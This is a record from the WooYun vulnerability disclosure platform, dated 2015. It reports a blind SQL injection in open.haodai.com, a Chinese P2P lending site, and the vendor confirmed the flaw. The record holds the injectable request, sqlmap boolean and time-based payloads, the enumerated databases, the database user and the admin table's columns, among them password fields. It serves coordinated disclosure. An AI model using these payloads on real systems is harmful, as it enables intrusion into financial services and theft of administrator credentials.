{"id": 47394, "wybug_id": "wooyun-2015-0128247", "wybug_title": "P2P金融安全之好贷网某站存在SQL盲注各种admin", "wybug_corp": "好贷网", "wybug_author": "二维码", "wybug_date": "2015-07-22 07:34", "wybug_open_date": "2015-09-05 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向公众公开  简要描述： 好在是布尔型盲注，跑的速度还行。表里各种admin amount 详细说明：  注入点：\nGET /list/index/city/beijing*/xd_type/gouche/money/10/month/12.html HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://open.haodai.com:80/Cookie: PHPSESSID=gc4u5iaklethl5v2c7ap443562; city=beijing; LANDING_PAGE=http%3A%2F%2Fopen.haodai.com%2F; desktop=0; REFERER=open.haodai.com; SOURCE_URL=http%3A%2F%2Fopen.haodai.com%2FHost: open.haodai.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*\n   漏洞证明：  \nback-end DBMS: MySQL 5.0.12sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://open.haodai.com:80/list/index/city/beijing') AND 2827=2827 AND ('IkuO'='IkuO/xd_type/gouche/money/10/month/12.html    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://open.haodai.com:80/list/index/city/beijing') AND (SELECT * FROM (SELECT(SLEEP(5)))WiVp) AND ('uRUa'='uRUa/xd_type/gouche/money/10/month/12.html---back-end DBMS: MySQL 5.0.12available databases [2]:[*] hd[*] information_schema\nuser:\nback-end DBMS: MySQL 5.0.12current user:    'liuliang_r@192.168.1.%'\nadmin表：\nback-end DBMS: MySQL 5.0.12Database: hdTable: admin[24 columns]+--------------+-----------------------+| Column       | Type                  |+--------------+-----------------------+| agent_num    | char(12)              || agent_passwd | varchar(16)           || agent_phone  | varchar(16)           || auth         | varchar(1024)         || citys        | text                  || citys_iued   | text                  || email        | varchar(255)          || id           | int(10) unsigned      || isreadtj     | tinyint(1) unsigned   || iutypes      | text                  || menuid       | smallint(5) unsigned  || name         | varchar(32)           || pwd          | char(60)              || pwd_key      | varchar(32)           || qq           | char(11)              || relation     | int(10) unsigned      || role         | varchar(10)           || stat         | tinyint(3) unsigned   || tel          | char(11)              || tquin        | int(11) unsigned      || type         | tinyint(3) unsigned   || weixin       | char(32)              || xdtypes      | text                  || zone_id      | mediumint(8) unsigned |+--------------+-----------------------+\n太晚了，具体的一些敏感信息就不跑了，毕竟是金融站。   修复方案：  这个你们更专业   版权声明：转载请注明来源 二维码@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-22 10:38 厂商回复： 多谢  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-05 13:35 |    \t\tddbug \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:9        )\t\t \n  怎么知道在那个地方呢？    \n     2015-09-17 10:47 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  怎么网贷注入的payload都差不多    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}